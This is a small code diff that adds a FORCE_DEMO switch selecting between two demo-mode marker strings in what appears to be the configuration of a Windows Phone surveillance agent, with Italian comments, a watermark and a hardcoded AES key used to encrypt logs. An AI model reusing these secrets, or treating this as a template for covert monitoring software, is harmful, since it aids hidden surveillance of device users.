@@ -34,8 +34,14 @@ water mark: B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW
 ///BYTE g_Subtype[16] = "WINMO\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
 BYTE g_Subtype[16] = "WINPHONE\x00\x00\x00\x00\x00\x00\x00";
 
+//#define FORCE_DEMO
+
+#ifdef FORCE_DEMO
+BYTE g_DemoMode[] = "12-WaVyPzMMMMmGbhP6qAigT";
+#else
 // Marker per il demo mode
 BYTE g_DemoMode[] = "Pg-WaVyPzMMMMmGbhP6qAigT";
+#endif
 
 // Chiave per cifrare i log
 BYTE g_AesKey[] = "WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg";
